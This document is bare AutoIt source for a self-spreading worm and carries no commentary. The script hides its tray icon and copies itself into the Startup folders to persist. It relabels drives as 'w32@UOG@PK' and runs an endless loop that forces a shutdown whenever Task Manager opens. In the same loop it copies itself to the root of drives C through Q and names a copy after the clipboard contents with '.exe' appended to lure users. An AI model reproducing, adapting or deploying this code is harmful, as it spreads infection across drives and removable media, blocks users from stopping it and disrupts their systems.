
$I = 0
$J = 0
$W = @WindowsDir
$S = @ScriptFullPath
$SN = @ScriptName
AutoItSetOption("TrayIconHide", 1)
$SUC = "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\" & $SN
$SUD = "D:\Documents and Settings\All Users\Start Menu\Programs\Startup\" & $SN
$SUE = "E:\Documents and Settings\All Users\Start Menu\Programs\Startup\" & $SN
$SUF = "F:\Documents and Settings\All Users\Start Menu\Programs\Startup\" & $SN
$SUG = "G:\Documents and Settings\All Users\Start Menu\Programs\Startup\" & $SN
FileCopy($S, $SUC, 1)
FileCopy($S, $SUD, 1)
FileCopy($S, $SUE, 1)
FileCopy($S, $SUF, 1)
FileCopy($S, $SUG, 1)
DriveSetLabel("C:\", "RAHSABUM")
If ProcessExists($SN) Then
	FileCopy($S, $W, 1)
Else
	Run($SN)
EndIf
FileCopy($S, $W, 1)
Do
	If ProcessExists("taskmgr.exe") Then
		Shutdown(13)
		ProcessClose("taskmgr.exe")
	EndIf
	DriveSetLabel("C:\", "w32@UOG@PK")
	DriveSetLabel("D:\", "w32@UOG@PK")
	DriveSetLabel("E:\", "w32@UOG@PK")
	DriveSetLabel("F:\", "w32@UOG@PK")
	DriveSetLabel("G:\", "w32@UOG@PK")
	DriveSetLabel("H:\", "w32@UOG@PK")
	DriveSetLabel("I:\", "w32@UOG@PK")
	DriveSetLabel("J:\", "w32@UOG@PK")
	DriveSetLabel("K:\", "w32@UOG@PK")
	DriveSetLabel("L:\", "w32@UOG@PK")
	DriveSetLabel("N:\", "w32@UOG@PK")
	DriveSetLabel("O:\", "w32@UOG@PK")
	$S = @ScriptFullPath
	$D = StringTrimRight(ClipGet(), "4") & ".exe" 
	FileCopy($S, $D, 1)
	FileCopy($S, "c:\", 1)
	FileCopy($S, "d:\", 1)
	FileCopy($S, "e:\", 1)
	FileCopy($S, "f:\", 1)
	FileCopy($S, "g:\", 1)
	FileCopy($S, "h:\", 1)
	FileCopy($S, "i:\", 1)
	FileCopy($S, "j:\", 1)
	FileCopy($S, "k:\", 1)
	FileCopy($S, "l:\", 1)
	FileCopy($S, "m:\", 1)
	FileCopy($S, "n:\", 1)
	FileCopy($S, "o:\", 1)
	FileCopy($S, "p:\", 1)
	FileCopy($S, "q:\", 1)
Until $I = 10